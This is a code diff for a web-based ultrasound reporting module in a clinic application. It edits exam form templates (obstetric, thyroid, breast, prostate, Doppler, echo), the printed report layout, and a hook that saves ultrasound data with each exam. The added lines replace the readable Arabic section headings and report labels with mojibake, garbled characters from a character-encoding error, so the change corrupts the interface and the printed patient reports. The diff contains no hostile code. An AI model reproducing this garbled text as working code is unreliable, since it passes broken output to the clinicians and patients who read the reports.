-            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Pregnancy Dating (تحديد عمر الحمل)</h6></div>
+            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Pregnancy Dating (ØªØ­Ø¯ÙŠØ¯ Ø¹Ù…Ø± Ø§Ù„Ø­Ù…Ù„)</h6></div>
             <div class="col-md-6"><label class="form-label">LMP</label><input type="date" class="form-control us-field" data-field="LMP"></div>
             <div class="col-md-6"><label class="form-label">Gestational Age</label><input type="text" class="form-control us-field" data-field="Gestational Age" placeholder="Weeks + Days"></div>
             
-            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Fetal Biometry (قياسات الجنين)</h6></div>
+            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Fetal Biometry (Ù‚ÙŠØ§Ø³Ø§Øª Ø§Ù„Ø¬Ù†ÙŠÙ†)</h6></div>
             <div class="col-md-3"><label class="form-label">BPD (mm)</label><input type="text" class="form-control us-field" data-field="BPD"></div>
             <div class="col-md-3"><label class="form-label">HC (mm)</label><input type="text" class="form-control us-field" data-field="HC"></div>
             <div class="col-md-3"><label class="form-label">AC (mm)</label><input type="text" class="form-control us-field" data-field="AC"></div>
@@ -11962,7 +11460,7 @@ if (ex.ultrasound) {
             <div class="col-md-6"><label class="form-label">EFW (Est. Fetal Weight)</label><input type="text" class="form-control us-field" data-field="EFW" placeholder="grams"></div>
             <div class="col-md-6"><label class="form-label">Fetal Heart Rate</label><input type="text" class="form-control us-field" data-field="Fetal Heart Rate" placeholder="bpm"></div>
             
-            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Placenta & Liquor (المشيمة والسائل الأمينوسي)</h6></div>
+            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Placenta & Liquor (Ø§Ù„Ù…Ø´ÙŠÙ…Ø© ÙˆØ§Ù„Ø³Ø§Ø¦Ù„ Ø§Ù„Ø£Ù…ÙŠÙ†ÙˆØ³ÙŠ)</h6></div>
             <div class="col-md-6"><label class="form-label">Placenta Position</label><input type="text" class="form-control us-field" data-field="Placenta Position" placeholder="..."></div>
             <div class="col-md-6"><label class="form-label">Placenta Grade</label><select class="form-select us-field" data-field="Placenta Grade"><option value="0">0</option><option value="I">I</option><option value="II">II</option><option value="III">III</option></select></div>
             <div class="col-md-6"><label class="form-label">Amniotic Fluid Index (AFI)</label><input type="text" class="form-control us-field" data-field="AFI" placeholder="cm"></div>
@@ -11972,18 +11470,18 @@ if (ex.ultrasound) {
     thyroid: `
         <h5 class="fw-bold text-primary mb-3"><i class="fas fa-bullseye"></i> Thyroid Ultrasound</h5>
         <div class="row g-3">
-            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Right Lobe (الفص الأيمن)</h6></div>
+            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Right Lobe (Ø§Ù„ÙØµ Ø§Ù„Ø£ÙŠÙ…Ù†)</h6></div>
             <div class="col-md-4"><label class="form-label">Length (mm)</label><input type="text" class="form-control us-field" data-field="Right Lobe Length" placeholder="mm"></div>
             <div class="col-md-4"><label class="form-label">Width (mm)</label><input type="text" class="form-control us-field" data-field="Right Lobe Width" placeholder="mm"></div>
             <div class="col-md-4"><label class="form-label">Thickness (mm)</label><input type="text" class="form-control us-field" data-field="Right Lobe Thickness" placeholder="mm"></div>
             
-            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Left Lobe & Isthmus (الفص الأيسر والبرزخ)</h6></div>
+            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Left Lobe & Isthmus (Ø§Ù„ÙØµ Ø§Ù„Ø£ÙŠØ³Ø± ÙˆØ§Ù„Ø¨Ø±Ø²Ø®)</h6></div>
             <div class="col-md-4"><label class="form-label">Length (mm)</label><input type="text" class="form-control us-field" data-field="Left Lobe Length" placeholder="mm"></div>
             <div class="col-md-4"><label class="form-label">Width (mm)</label><input type="text" class="form-control us-field" data-field="Left Lobe Width" placeholder="mm"></div>
             <div class="col-md-4"><label class="form-label">Thickness (mm)</label><input type="text" class="form-control us-field" data-field="Left Lobe Thickness" placeholder="mm"></div>
             <div class="col-md-12"><label class="form-label">Isthmus Thickness</label><input type="text" class="form-control us-field" data-field="Isthmus Thickness" placeholder="mm"></div>
             
-            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Nodules & Assessment (العقد والتصنيف)</h6></div>
+            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Nodules & Assessment (Ø§Ù„Ø¹Ù‚Ø¯ ÙˆØ§Ù„ØªØµÙ†ÙŠÙ)</h6></div>
             <div class="col-md-4"><label class="form-label">Nodules Number</label><input type="number" class="form-control us-field" data-field="Thyroid Nodules Number"></div>
             <div class="col-md-4"><label class="form-label">Nodules Size</label><input type="text" class="form-control us-field" data-field="Thyroid Nodules Size" placeholder="mm"></div>
             <div class="col-md-4"><label class="form-label">TI-RADS Classification</label><select class="form-select us-field" data-field="TI-RADS"><option value="1">TR1 - Benign</option><option value="2">TR2 - Not Suspicious</option><option value="3">TR3 - Mildly Suspicious</option><option value="4">TR4 - Moderately Suspicious</option><option value="5">TR5 - Highly Suspicious</option></select></div>
@@ -11993,17 +11491,17 @@ if (ex.ultrasound) {
     breast: `
         <h5 class="fw-bold text-primary mb-3"><i class="fas fa-female"></i> Breast Ultrasound</h5>
         <div class="row g-3">
-            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Right Breast (الثدي الأيمن)</h6></div>
+            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Right Breast (Ø§Ù„Ø«Ø¯ÙŠ Ø§Ù„Ø£ÙŠÙ…Ù†)</h6></div>
             <div class="col-md-4"><label class="form-label">Right Breast Mass</label><select class="form-select us-field" data-field="Right Breast Mass"><option value="No">No</option><option value="Yes">Yes</option></select></div>
             <div class="col-md-4"><label class="form-label">Mass Size (Right)</label><input type="text" class="form-control us-field" data-field="Right Mass Size" placeholder="mm"></div>
             <div class="col-md-4"><label class="form-label">Location (Right)</label><input type="text" class="form-control us-field" data-field="Right Mass Location" placeholder="O'clock"></div>
             
-            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Left Breast (الثدي الأيسر)</h6></div>
+            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Left Breast (Ø§Ù„Ø«Ø¯ÙŠ Ø§Ù„Ø£ÙŠØ³Ø±)</h6></div>
             <div class="col-md-4"><label class="form-label">Left Breast Mass</label><select class="form-select us-field" data-field="Left Breast Mass"><option value="No">No</option><option value="Yes">Yes</option></select></div>
             <div class="col-md-4"><label class="form-label">Mass Size (Left)</label><input type="text" class="form-control us-field" data-field="Left Mass Size" placeholder="mm"></div>
             <div class="col-md-4"><label class="form-label">Location (Left)</label><input type="text" class="form-control us-field" data-field="Left Mass Location" placeholder="O'clock"></div>
             
-            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Assessment (التقييم)</h6></div>
+            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Assessment (Ø§Ù„ØªÙ‚ÙŠÙŠÙ…)</h6></div>
             <div class="col-md-6"><label class="form-label">Axillary Lymph Nodes</label><input type="text" class="form-control us-field" data-field="Axillary Lymph Nodes" placeholder="..."></div>
             <div class="col-md-6"><label class="form-label">BI-RADS</label><select class="form-select us-field" data-field="BI-RADS"><option value="1">1 - Negative</option><option value="2">2 - Benign</option><option value="3">3 - Probably Benign</option><option value="4">4 - Suspicious</option><option value="5">5 - Highly Suggestive of Malignancy</option><option value="6">6 - Known Biopsy-Proven</option></select></div>
         </div>
@@ -12011,13 +11509,13 @@ if (ex.ultrasound) {
     prostate: `
         <h5 class="fw-bold text-primary mb-3"><i class="fas fa-mars"></i> Prostate Ultrasound</h5>
         <div class="row g-3">
-            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Dimensions & Volume (الأبعاد والحجم)</h6></div>
+            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Dimensions & Volume (Ø§Ù„Ø£Ø¨Ø¹Ø§Ø¯ ÙˆØ§Ù„Ø­Ø¬Ù…)</h6></div>
             <div class="col-md-3"><label class="form-label">Length (cm)</label><input type="number" class="form-control us-field prosL" data-field="Prostate Length" placeholder="cm" oninput="window.calculateProstateVol(this)"></div>
             <div class="col-md-3"><label class="form-label">Width (cm)</label><input type="number" class="form-control us-field prosW" data-field="Prostate Width" placeholder="cm" oninput="window.calculateProstateVol(this)"></div>
             <div class="col-md-3"><label class="form-label">Height (cm)</label><input type="number" class="form-control us-field prosH" data-field="Prostate Height" placeholder="cm" oninput="window.calculateProstateVol(this)"></div>
             <div class="col-md-3"><label class="form-label fw-bold text-danger">Volume (cc)</label><input type="text" class="form-control us-field fw-bold text-danger prosV" data-field="Prostate Volume" readonly placeholder="Auto-calc"></div>
             
-            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Parenchyma & Bladder (البروستاتا والمثانة)</h6></div>
+            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Parenchyma & Bladder (Ø§Ù„Ø¨Ø±ÙˆØ³ØªØ§ØªØ§ ÙˆØ§Ù„Ù…Ø«Ø§Ù†Ø©)</h6></div>
             <div class="col-md-6"><label class="form-label">Enlargement</label><select class="form-select us-field" data-field="Prostate Enlargement"><option value="No">No</option><option value="Yes">Yes</option></select></div>
             <div class="col-md-6"><label class="form-label">Calcifications</label><select class="form-select us-field" data-field="Prostate Calcifications"><option value="No">No</option><option value="Yes">Yes</option></select></div>
             <div class="col-md-12"><label class="form-label">Residual Urine Volume</label><input type="text" class="form-control us-field" data-field="Residual Urine Volume" placeholder="ml"></div>
@@ -12026,15 +11524,15 @@ if (ex.ultrasound) {
     doppler: `
         <h5 class="fw-bold text-primary mb-3"><i class="fas fa-tint"></i> Doppler Study</h5>
         <div class="row g-3">
-            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Details (تفاصيل الفحص)</h6></div>
+            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Details (ØªÙØ§ØµÙŠÙ„ Ø§Ù„ÙØ­Øµ)</h6></div>
             <div class="col-md-12"><label class="form-label">Side</label><select class="form-select us-field" data-field="Doppler Side"><option value="Bilateral">Bilateral</option><option value="Right">Right</option><option value="Left">Left</option></select></div>
             
-            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Arterial Measurements (القياسات الشريانية)</h6></div>
+            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Arterial Measurements (Ø§Ù„Ù‚ÙŠØ§Ø³Ø§Øª Ø§Ù„Ø´Ø±ÙŠØ§Ù†ÙŠØ©)</h6></div>
             <div class="col-md-4"><label class="form-label">Arterial PSV</label><input type="text" class="form-control us-field" data-field="Arterial PSV" placeholder="cm/s"></div>
             <div class="col-md-4"><label class="form-label">Arterial EDV</label><input type="text" class="form-control us-field" data-field="Arterial EDV" placeholder="cm/s"></div>
             <div class="col-md-4"><label class="form-label">Arterial RI</label><input type="text" class="form-control us-field" data-field="Arterial RI" placeholder="0.0 - 1.0"></div>
             
-            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Venous Assessment (التقييم الوريدي)</h6></div>
+            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Venous Assessment (Ø§Ù„ØªÙ‚ÙŠÙŠÙ… Ø§Ù„ÙˆØ±ÙŠØ¯ÙŠ)</h6></div>
             <div class="col-md-6"><label class="form-label">Venous Compressibility</label><select class="form-select us-field" data-field="Venous Compressibility"><option value="Compressible">Compressible</option><option value="Non-Compressible">Non-Compressible</option></select></div>
             <div class="col-md-6"><label class="form-label">Thrombus Presence</label><select class="form-select us-field" data-field="Thrombus Presence"><option value="No">No</option><option value="Yes">Yes</option></select></div>
             <div class="col-md-12"><label class="form-label">Color Flow</label><select class="form-select us-field" data-field="Color Flow"><option value="Normal">Normal</option><option value="Abnormal">Abnormal</option></select></div>
@@ -12043,13 +11541,13 @@ if (ex.ultrasound) {
     echo: `
         <h5 class="fw-bold text-primary mb-3"><i class="fas fa-heartbeat"></i> Echocardiography</h5>
         <div class="row g-3">
-            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Ventricle & Atrium (البطين والأذين)</h6></div>
+            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Ventricle & Atrium (Ø§Ù„Ø¨Ø·ÙŠÙ† ÙˆØ§Ù„Ø£Ø°ÙŠÙ†)</h6></div>
             <div class="col-md-4"><label class="form-label">LVEDD</label><input type="text" class="form-control us-field" data-field="LVEDD" placeholder="cm"></div>
             <div class="col-md-4"><label class="form-label">LVESD</label><input type="text" class="form-control us-field" data-field="LVESD" placeholder="cm"></div>
             <div class="col-md-4"><label class="form-label fw-bold text-danger">EF %</label><input type="text" class="form-control us-field fw-bold text-danger" data-field="Ejection Fraction" placeholder="%"></div>
             <div class="col-md-12"><label class="form-label">Left Atrium Diameter</label><input type="text" class="form-control us-field" data-field="Left Atrium Diameter" placeholder="cm"></div>
             
-            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Valves & Pressures (الصمامات والضغوط)</h6></div>
+            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Valves & Pressures (Ø§Ù„ØµÙ…Ø§Ù…Ø§Øª ÙˆØ§Ù„Ø¶ØºÙˆØ·)</h6></div>
             <div class="col-md-3"><label class="form-label">Mitral Valve</label><select class="form-select us-field" data-field="Mitral Valve"><option value="Normal">Normal</option><option value="Regurgitation">Regurgitation</option><option value="Stenosis">Stenosis</option></select></div>
             <div class="col-md-3"><label class="form-label">Aortic Valve</label><select class="form-select us-field" data-field="Aortic Valve"><option value="Normal">Normal</option><option value="Regurgitation">Regurgitation</option><option value="Stenosis">Stenosis</option></select></div>
             <div class="col-md-3"><label class="form-label">Tricuspid Valve</label><select class="form-select us-field" data-field="Tricuspid Valve"><option value="Normal">Normal</option><option value="Regurgitation">Regurgitation</option><option value="Stenosis">Stenosis</option></select></div>
@@ -12060,7 +11558,7 @@ if (ex.ultrasound) {
     `
 };
 
-    const US_HTML_WRAPPER = `
+const US_HTML_WRAPPER = `
 <div class="row g-3 mb-3">
     <div class="col-md-12">
         <div class="section-heading" style="background: linear-gradient(90deg, #0284c7, #0369a1); color: white; padding: 12px; border-radius: 12px;">
@@ -12117,6 +11615,8 @@ if (ex.ultrasound) {
 `;
 
 function injectUsTemplates() {
+    // We already manually injected one copy in the HTML replacing the main echo.
+    // Let's populate its inner templates.
     document.querySelectorAll('.us-dynamic-forms-container').forEach(container => {
         container.querySelectorAll('.us-form-section').forEach(section => {
             const tType = section.getAttribute('data-type');
@@ -12156,7 +11656,7 @@ window.getUsData = function(container) {
             container = activeTab.querySelector('.us-module-container');
         }
     }
-    if(!container) container = document.querySelector('.us-module-container');
+    if(!container) container = document.querySelector('.us-module-container'); // Fallback
     if(!container) return null;
     
     const selectEl = container.querySelector('.us-exam-type');
@@ -12236,7 +11736,7 @@ window.printUsReport = function(btnEl) {
     let rows = '';
     for(const key in usData.fields) {
         if(usData.fields[key]) {
-            rows += `<tr><td style="font-weight:bold; width: 40%; text-align: left;">${key}</td><td style="text-align: right;">${usData.fields[key]}</td></tr>`;
+            rows += `<tr><td style="font-weight:bold; width: 40%;">${key}</td><td>${usData.fields[key]}</td></tr>`;
         }
     }
     
@@ -12259,10 +11759,11 @@ window.printUsReport = function(btnEl) {
             .patient-info { display: flex; justify-content: space-between; margin-bottom: 30px; font-size: 16px; font-weight: bold; background: #f8fafc; padding: 15px; border-radius: 8px; border: 1px solid #e2e8f0; }
             table { width: 100%; border-collapse: collapse; margin-bottom: 30px; font-size: 15px; }
             th, td { border: 1px solid #e2e8f0; padding: 10px 15px; }
-            th { background: #f8fafc; font-weight: 900; }
+            td { text-align: left; }
+            td:nth-child(2) { text-align: right; font-weight: bold; }
             .conclusion { background: #f0fdf4; border-right: 5px solid #22c55e; padding: 20px; border-radius: 8px; margin-top: 30px; }
-            .signature { margin-top: 60px; margin-right: auto; margin-left: 0; width: 220px; text-align: center; }
-            .signature p { margin: 0; }
+            .signature { margin-top: 60px; text-align: right; }
+            .signature p { margin: 0; font-weight: bold; font-size: 18px; }
         </style>
     </head>
     <body>
@@ -12280,8 +11781,8 @@ window.printUsReport = function(btnEl) {
         </div>
         
         <div class="patient-info">
-            <div><strong>اسم المريض (Patient):</strong> ${window.currentExamPatientData?.name || window.globalSelectedPatientData?.name || '______________________'}</div>
-            <div><strong>التاريخ (Date):</strong> ${new Date().toISOString().split('T')[0]}</div>
+            <div><strong>Ø§Ø³Ù… Ø§Ù„Ù…Ø±ÙŠØ¶ (Patient):</strong> ${window.currentExamPatientData?.name || window.globalSelectedPatientData?.name || '______________________'}</div>
+            <div><strong>Ø§Ù„ØªØ§Ø±ÙŠØ® (Date):</strong> ${new Date().toISOString().split('T')[0]}</div>
         </div>
         
         <table>
@@ -12309,8 +11810,9 @@ window.printUsReport = function(btnEl) {
         </div>` : ''}
         
         <div class="signature">
-            <p style="color: #0284c7; margin-bottom: 5px; margin-top: 0;">___________________</p>
-            <p style="font-size: 14px; color: #1e293b; font-weight: bold; margin: 0;">توقيع الطبيب: د. ${doctorName}</p>
+            <p>Signature</p>
+            <p style="color: #0284c7; margin-top: 10px;">___________________</p>
+            <p style="font-size: 14px; color: #777;">${doctorName}</p>
         </div>
     </body>
     </html>
@@ -12320,15 +11822,20 @@ window.printUsReport = function(btnEl) {
 };
 
 document.addEventListener('DOMContentLoaded', () => {
+    // Replace all existing echo tables in the document with US_HTML_WRAPPER
     document.querySelectorAll('.echo-table-wrap').forEach(el => {
         el.outerHTML = US_HTML_WRAPPER;
     });
+    
+    // Call inject again to populate the newly replaced containers
     injectUsTemplates();
 });
 
+// Hook into saveTabExam to inject our ultrasound data
 const originalSaveTabExam = window.saveTabExam;
 if(originalSaveTabExam) {
     window.saveTabExam = async function(e, type) {
+        // Collect ultrasound data from the active tab before saving
         const activeTab = document.querySelector('.tab-pane.active');
         if(activeTab) {
             const container = activeTab.querySelector('.us-module-container');
@@ -12339,8 +11846,7 @@ if(originalSaveTabExam) {
         await originalSaveTabExam(e, type);
     };
 }
+</script>
+<!-- ================= END ULTRASOUND MODULE ================= -->
 
-    </script>
-    <!-- ================= END ULTRASOUND MODULE ================= -->
-
-    </html>
+</html>
